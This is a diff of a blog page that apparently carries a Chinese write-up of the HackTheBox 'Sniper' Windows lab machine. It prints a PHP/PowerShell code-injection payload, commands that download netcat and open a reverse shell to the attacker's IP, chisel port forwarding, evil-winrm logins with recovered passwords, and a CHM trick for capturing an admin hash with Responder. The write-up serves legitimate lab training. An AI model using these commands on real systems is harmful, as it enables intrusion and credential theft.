@@ -1,25 +1,32 @@
 <!DOCTYPE html>
-<html>
-<head hexo-theme='https://volantis.js.org/#@byc_404'>
+<html lang="">
+  <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/'>
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
     
   
   <!-- 渲染优化 -->
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
   <meta name="renderer" content="webkit">
   <meta name="force-rendering" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
   <meta name="HandheldFriendly" content="True" >
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <link rel="preload" href="/css/first.css" as="style">
+  
 
   <!-- 页面元数据 -->
   
-    <title>hackthebox-Sniper--初尝windows靶机 - byc_404&#39;s blog</title>
+  <title>hackthebox-Sniper--初尝windows靶机 - byc_404&#39;s blog</title>
   
     <meta name="keywords" content="WEB,hackthebox,pentest,windows">
   
+
   
     <meta name="description" content="好久没做htb的靶机，这次又跟着着大佬的思路去做了一台新的靶机。不同以往的是,这次的靶机Sniper是windows靶机，因此也收获了许多新姿势。就是在中间从github下了不少东西……因为不是假期，具体过程不会像以往那么详细。同时windows靶机下自己不太理解的东西也希望不会给别人带进误区。有趣的是,这台靶机...">
   
@@ -33,92 +40,85 @@
   
 
   <!-- link -->
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
   
-    
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
-
-  
-  
-    
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
-
-  
-
-  
-  <link rel="shortcut icon" type='image/x-icon' href="/assests/favicon.ico">
-  
-
-  
-
+    <link rel="shortcut icon" type='image/x-icon' href="/assests/favicon.ico">
   
 
   <!-- import link -->
   
 
   
-  
     
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/css/style.css">
+<link rel="stylesheet" href="/css/first.css">
 
   
 
-  <script>
-    function setLoadingBarProgress(num) {
-      document.getElementById('loading-bar').style.width=num+"%";
-    }
-  </script>
+  
+  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
+  
+
+  <script id="loadcss"></script>
 
   
-  
+<script>
+if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
+    document.write(
+	'<style>'+
+		'html{'+
+			'overflow-x: hidden !important;'+
+			'overflow-y: hidden !important;'+
+		'}'+
+		'.kill-ie{'+
+			'text-align:center;'+
+			'height: 100%;'+
+			'margin-top: 15%;'+
+			'margin-bottom: 5500%;'+
+		'}'+
+	'</style>'+
+    '<div class="kill-ie">'+
+        '<h1><b>抱歉，您的浏览器无法访问本站</b></h1>'+
+        '<h3>微软已经于2016年终止了对 Internet Explorer (IE) 10 及更早版本的支持，<br/>'+
+        '继续使用存在极大的安全隐患，请使用当代主流的浏览器进行访问。</h3><br/>'+
+        '<a href="https://www.microsoft.com/zh-cn/WindowsForBusiness/End-of-IE-support" target="_blank" rel="noopener"><strong>了解详情 ></strong></a>'+
+    '</div>');
+</script>
+
+
+<noscript>
+	<style>
+		html{
+			overflow-x: hidden !important;
+			overflow-y: hidden !important;
+		}
+		.kill-noscript{
+			text-align:center;
+			height: 100%;
+			margin-top: 15%;
+			margin-bottom: 5500%;
+		}
+	</style>
+    <div class="kill-noscript">
+        <h1><b>抱歉，您的浏览器无法访问本站</b></h1>
+        <h3>本页面需要浏览器支持（启用）JavaScript</h3><br/>
+        <a href="https://www.baidu.com/s?wd=启用JavaScript" target="_blank" rel="noopener"><strong>了解详情 ></strong></a>
+    </div>
+</noscript>
+
 </head>
 
-<body>
-  
-  <div class="cover-wrapper">
+  <body>
     
-      <cover class='cover post half'>
-        <div class='cover-body'>
-  <div class='a'>
-    
-    
-      <p class="title">byc_404's blog</p>
-    
-    
-      <p class="subtitle">Do not go gentle into that good night</p>
-    
-  </div>
-  <div class='b'>
-    
-      <div class="m_search">
-        <form name="searchform" class="form u-search-form">
-          <input type="text" class="input u-search-input" placeholder="" />
-          <i class="icon fas fa-search fa-fw"></i>
-        </form>
-      </div>
-    
-    <div class='menu navigation'>
-      <ul class='cover-list-h'>
-        
-      </ul>
-    </div>
-  </div>
-</div>
 
-      </cover>
-    
-    <div id="loading-bar-wrapper">
-  <div id="loading-bar"></div>
-</div>
-<header class="l_header shadow blur">
+<header id="l_header" class="l_header auto shadow blur " style='opacity: 0' >
   <div class='container'>
-  <div class='wrapper'>
+  <div id='wrapper'>
     <div class='nav-sub'>
       <p class="title"></p>
-      <ul class='switcher nav-list-h'>
-        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
         
-          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
         
       </ul>
     </div>
@@ -129,21 +129,18 @@
           
           
           
-          
-            IGNITE <b><sup style='color:#3AA757'>@byc_404</sup></b>
-          
         </a>
       
 
 			<div class='menu navigation'>
-				<ul class='nav-list-h'>
+				<ul class='nav-list-h m-pc'>
           
           
           
             
             
               <li>
-                <a class="flat-box" href=/
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
                   
                   
                   
@@ -159,23 +156,7 @@
             
             
               <li>
-                <a class="flat-box" href=/categories/
-                  
-                  
-                  
-                    id="categories"
-                  >
-                  <i class='fas fa-folder-open fa-fw'></i>分类
-                </a>
-                
-              </li>
-            
-          
-          
-            
-            
-              <li>
-                <a class="flat-box" href=/tags/
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
                   
                   
                   
@@ -191,7 +172,7 @@
             
             
               <li>
-                <a class="flat-box" href=/archives/
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
                   
                   
                   
@@ -207,7 +188,7 @@
             
             
               <li>
-                <a class="flat-box" href=/friends/
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
                   
                   
                   
@@ -223,7 +204,7 @@
             
             
               <li>
-                <a class="flat-box" href=/about/
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
                   
                   
                   
@@ -242,11 +223,11 @@
       <div class="m_search">
         <form name="searchform" class="form u-search-form">
           <i class="icon fas fa-search fa-fw"></i>
-          <input type="text" class="input u-search-input" placeholder="Search..." />
+          <input type="text" class="input u-search-input" placeholder="搜索" />
         </form>
       </div>
 
-			<ul class='switcher nav-list-h'>
+			<ul class='switcher nav-list-h m-phone'>
 				
 					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
 				
@@ -257,7 +238,7 @@
               
             
               <li>
-                <a class="flat-box" href=/
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
                   
                   
                   
@@ -273,23 +254,7 @@
               
             
               <li>
-                <a class="flat-box" href=/categories/
-                  
-                  
-                  
-                    id="categories"
-                  >
-                  <i class='fas fa-folder-open fa-fw'></i>分类
-                </a>
-                
-              </li>
-            
-          
-            
-              
-            
-              <li>
-                <a class="flat-box" href=/tags/
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
                   
                   
                   
@@ -305,7 +270,7 @@
               
             
               <li>
-                <a class="flat-box" href=/archives/
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
                   
                   
                   
@@ -321,7 +286,7 @@
               
             
               <li>
-                <a class="flat-box" href=/friends/
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
                   
                   
                   
@@ -337,7 +302,7 @@
               
             
               <li>
-                <a class="flat-box" href=/about/
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
                   
                   
                   
@@ -358,87 +323,149 @@
   </div>
 </header>
 
-<script>setLoadingBarProgress(40);</script>
+    <div id="l_body">
+      <div id="l_cover">
+  
+    
+        <div id="half" class='cover-wrapper post dock' style="display: ;">
+          
+            <div id='cover-backstretch'></div>
+          
+          <div class='cover-body'>
+  <div class='top'>
+    
+    
+      <p class="title">byc_404's blog</p>
+    
+    
+      <p class="subtitle">Do not go gentle into that good night</p>
+    
+  </div>
+  <div class='bottom'>
+    <div class='menu navigation'>
+      <div class='list-h'>
+        
+          
+            <a href="/"
+              
+              
+              id="home">
+              <i class='fas fa-rss fa-fw'></i><p>博客</p>
+            </a>
+          
+            <a href="/tags/"
+              
+              
+              id="tags">
+              <i class='fas fa-tags fa-fw'></i><p>标签</p>
+            </a>
+          
+            <a href="/archives/"
+              
+              
+              id="archives">
+              <i class='fas fa-archive fa-fw'></i><p>归档</p>
+            </a>
+          
+            <a href="/friends/"
+              
+              
+              id="friends">
+              <i class='fas fa-link fa-fw'></i><p>友链</p>
+            </a>
+          
+            <a href="/about/"
+              
+              
+              id="about">
+              <i class='fas fa-info-circle fa-fw'></i><p>关于</p>
+            </a>
+          
+        
+      </div>
+    </div>
+  </div>
+</div>
 
+          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+        </div>
+    
+  
   </div>
 
-
-  <div class="l_body">
-    <div class='body-wrapper'>
-      
+      <div id="safearea">
+        <div class="body-wrapper" id="pjax-container">
+          
 
 <div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
   
 
+
   
-    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
-      
-
-
-  <section class='meta'>
+  <div class="article-meta" id="top">
     
-      
-      
-      <div class="meta" id="header-meta">
+    
+    
+      <h1 class="title">
+        hackthebox-Sniper--初尝windows靶机
+      </h1>
+      <div class='new-meta-box'>
         
           
-  <h1 class="title">
-    <a href="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/">
-      hackthebox-Sniper--初尝windows靶机
-    </a>
-  </h1>
-
-
-        
-        <div class='new-meta-box'>
-          
             
-          
-            
-              
 <div class='new-meta-item author'>
-  <a href="https://www.bycsec.top" rel="nofollow">
-    <img src="/assests/favicon.ico">
+  <a class='author' href="https://www.bycsec.top" rel="nofollow">
+    <img no-lazy src="/assests/favicon.ico">
     <p>byc_404</p>
   </a>
 </div>
 
-            
+          
+        
           
             
-              
 
-            
           
-            
-              <div class="new-meta-item date">
+        
+          
+            <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
     <p>发布于：Apr 1, 2020</p>
   </a>
 </div>
 
-            
           
-            
-          
-        </div>
         
-          <hr>
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="hackthebox-Sniper--初尝windows靶机" data-path="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
         
       </div>
     
-  </section>
+  </div>
 
 
-      <section class="article typo">
-        <div class="article-entry" itemprop="articleBody">
-          
-          <p>好久没做htb的靶机，这次又跟着着大佬的思路去做了一台新的靶机。不同以往的是,这次的靶机Sniper是windows靶机，因此也收获了许多新姿势。就是在中间从github下了不少东西……因为不是假期，具体过程不会像以往那么详细。同时windows靶机下自己不太理解的东西也希望不会给别人带进误区。<br>有趣的是,这台靶机获得webroot的shell有不同的操作方法，同时具体后面提权时也将有不同的方法进行细节上不同的操作。具体细节将在后面的文章中提到。</p>
+  
+  
+  <p>好久没做htb的靶机，这次又跟着着大佬的思路去做了一台新的靶机。不同以往的是,这次的靶机Sniper是windows靶机，因此也收获了许多新姿势。就是在中间从github下了不少东西……因为不是假期，具体过程不会像以往那么详细。同时windows靶机下自己不太理解的东西也希望不会给别人带进误区。<br>有趣的是,这台靶机获得webroot的shell有不同的操作方法，同时具体后面提权时也将有不同的方法进行细节上不同的操作。具体细节将在后面的文章中提到。</p>
 <a id="more"></a>
 
 
-<p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/-1.PNG" alt></p>
+<p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/-1.PNG" class="lazyload" data-srcset="hackthebox-Sniper--%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/-1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>攻击机ip： kalilinux 10.10.15.189<br>靶机ip windows10 10.10.10.151 </p>
 <h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先是老套的端口扫描</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-01 09:20 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.151</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Sniper Co.</span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 7h02m38s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-04-01T08:23:29</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure>
@@ -462,17 +489,17 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'wget 10.10.15.189/nc.exe -O \windows\temp\exp.exe'</span> | iconv -t utf-16le | base64 -w 0</span><br></pre></td></tr></table></figure>
 <p>将准备好的payload进行编码避免过滤。<br>注册新用户名为</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=`powershell /enc &#123;your encoded  command &#125;`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这里使用/enc是powershell对应的解码flag,没使用-enc是为了解决过滤问题。<br>然后包含对应的用户的session即可执行。<br>再利用lfi检查是否已经把nc传上去了<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/0.PNG" alt></p>
+<p>这里使用/enc是powershell对应的解码flag,没使用-enc是为了解决过滤问题。<br>然后包含对应的用户的session即可执行。<br>再利用lfi检查是否已经把nc传上去了<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/0.PNG" class="lazyload" data-srcset="hackthebox-Sniper--%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>很好。那么再进行反弹shell的命令吧。<br>payload:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'c:\windows\temp\exp.exe 10.10.15.189 8899 -e powershell'</span> | iconv -t utf-16le | base64 -w 0</span><br></pre></td></tr></table></figure>
 <p>本机监听8899.浏览器包含,并得到webshell</p>
-<p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/1.PNG" alt></p>
-<h2 id="user-shell"><a href="#user-shell" class="headerlink" title="user shell"></a>user shell</h2><p>拿到webshell后我们首先检查下源码。很快就有所发现<br>\user\db.php中可以发现一个数据库的密码<code>36mEAhz/B8xQ~2VM</code>.而且在User中可以发现用户Chris的存在。<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/3.PNG" alt><br>下面尝试拿到usershell.<br>这里将再次用到我们之前使用过的端口转发。不过需要一个工具来帮助我们实现。<br><a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener">https://github.com/jpillora/chisel</a><br>从githubrelease处下载chisel的linux与windows版本。分别用于本机与靶机。然后wget把windows版本的传输到靶机上。</p>
+<p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/1.PNG" class="lazyload" data-srcset="hackthebox-Sniper--%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<h2 id="user-shell"><a href="#user-shell" class="headerlink" title="user shell"></a>user shell</h2><p>拿到webshell后我们首先检查下源码。很快就有所发现<br>\user\db.php中可以发现一个数据库的密码<code>36mEAhz/B8xQ~2VM</code>.而且在User中可以发现用户Chris的存在。<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/3.PNG" class="lazyload" data-srcset="hackthebox-Sniper--%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>下面尝试拿到usershell.<br>这里将再次用到我们之前使用过的端口转发。不过需要一个工具来帮助我们实现。<br><a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener">https://github.com/jpillora/chisel</a><br>从githubrelease处下载chisel的linux与windows版本。分别用于本机与靶机。然后wget把windows版本的传输到靶机上。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali: chmod +x chisel_linux_amd64</span><br><span class="line">./chisel_linux_amd64 server -p 8000 --reverse</span><br><span class="line"></span><br><span class="line">shell: wget http://10.10.15.189/chisel.exe -O chisel.exe</span><br><span class="line">	</span><br><span class="line">portforwarding: .\chisel.exe client 10.10.15.189:8000 R:5985:127.0.0.1:5985 R:3306:127.0.0.1:3306</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/2.PNG" alt></p>
+<p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/2.PNG" class="lazyload" data-srcset="hackthebox-Sniper--%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>开启<code>--reverse</code>允许我们转发端口。而最后一步我们把5985与3306端口转发到本地。5985对应的是WinRM服务，可用于远程管理。我们把它转发到本地后，可以利用另一个渗透工具evil-winrm进行用户登录。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Hackplayers/evil-winrm</span><br><span class="line">sudo gem install winrm winrm-fs stringio</span><br></pre></td></tr></table></figure>
-<p>只需两步即可使用。<br>然后evil-winrm继续登录，直接本地127.0.0.1即可。因为我们端口已经转发好了。<br><code>./evil-winrm.rb -u chris -p &#39;36mEAhz/B8xQ~2VM&#39; -i 127.0.0.1</code><br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/4.PNG" alt><br>拿到usershell.</p>
+<p>只需两步即可使用。<br>然后evil-winrm继续登录，直接本地127.0.0.1即可。因为我们端口已经转发好了。<br><code>./evil-winrm.rb -u chris -p &#39;36mEAhz/B8xQ~2VM&#39; -i 127.0.0.1</code><br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/4.PNG" class="lazyload" data-srcset="hackthebox-Sniper--%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>拿到usershell.</p>
 <p>之所以用这么多工具进行user的提权其实是因为这里想要通过其他方法得到usershell要再次反弹shell.<br>并且操作起来有点麻烦.这里我简单提一下，就是直接通过powershell命令创建一个属于Chris的变量，然后再反弹shell.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = convertto-securestring <span class="string">'36mEAhz/B8xQ~2VM'</span> -asplaintext -force</span><br><span class="line"><span class="variable">$cred</span> = new-object system.management.automation.pscredential(<span class="string">"sniper\chris"</span>, <span class="variable">$pass</span>)</span><br><span class="line">invoke-command -computer sniper -scriptblock &#123; whoami &#125; -credential <span class="variable">$cred</span></span><br></pre></td></tr></table></figure>
 <p>变量成功创建的话，最后一条命令的回显应该是<code>sniper\chris</code><br>然后下面的命令可以重新弹shell，得到usershell</p>
@@ -482,7 +509,7 @@
 
 <h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><p>那么又到了最后的root提权时间。<br>在C:\docs中可以发现这样一个有趣的txt</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hi Chris,</span><br><span class="line">Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it.</span><br><span class="line">And I hope that you&#39;ve prepared the documentation for our new app. Drop it here when you&#39;re done with it.</span><br><span class="line">Regards,</span><br><span class="line">Sniper CEO.</span><br></pre></td></tr></table></figure>
-<p>有意思。似乎在提示我们,传到这个文件夹下的东西可能会被CEO检测。这也就类似xss中我们的payload被检查时可以打到admin的cookie.这里我们是否也能通过可执行文件让administrator检查,拿到administrator的权限呢？<br>同样在Chris的Downloads目录下我们发现一个instructions.chm文件。拿到windows本机打开,将发现<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/4.5.PNG" alt><br>那么我们应该就是要使用chm文件进行操作了。同时利用的思路也大致清楚了：</p>
+<p>有意思。似乎在提示我们,传到这个文件夹下的东西可能会被CEO检测。这也就类似xss中我们的payload被检查时可以打到admin的cookie.这里我们是否也能通过可执行文件让administrator检查,拿到administrator的权限呢？<br>同样在Chris的Downloads目录下我们发现一个instructions.chm文件。拿到windows本机打开,将发现<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/4.5.PNG" class="lazyload" data-srcset="hackthebox-Sniper--%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/4.5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>那么我们应该就是要使用chm文件进行操作了。同时利用的思路也大致清楚了：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.windows本机下操作生成chm文件</span><br><span class="line">2.上传chm文件,其中payload将打到本机 #类似xss的道理</span><br><span class="line">3.监听本机，得到administrator信息。</span><br></pre></td></tr></table></figure>
 
 <p>简单提下chm文件。其实就是html文件的帮助文件系统。而且想要操作起来很简单,只要在win10电脑的<code>C:\Program Files (x86)\HTML Help Workshop</code>中即可找到。<br>当然我们还要从微软官网下载最新的<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21138" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=21138</a><br>先创建一个html文件</p>
@@ -490,71 +517,54 @@
 <p>里面的src资源指向我们本机任意资源，说白了就是让admin触发且我们能收到请求而已。<br>在windows本机以管理员权限打开hhw.exe，创建test.hpp项目添加我们刚刚的index.html并编译，即可生成一个chm文件。<br>然后回到本机,先起一个监听<br><code>responder -I tun0</code></p>
 <p>wget上传文件到docs文件夹下</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.15.189/test.chm -O exp.chm</span><br></pre></td></tr></table></figure>
-<p>很快就能收到请求<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/5.PNG" alt><br>这是一串管理员密码的hash.到网站上解码可得管理员密码<code>butterfly!#1</code>.</p>
+<p>很快就能收到请求<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/5.PNG" class="lazyload" data-srcset="hackthebox-Sniper--%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>这是一串管理员密码的hash.到网站上解码可得管理员密码<code>butterfly!#1</code>.</p>
 <p>然后登尝试登陆。由于开放了445端口，我们直接用smb服务可以直接登录。<br>当然我没有起smb服务，使用下面github上的python脚本即可替代。</p>
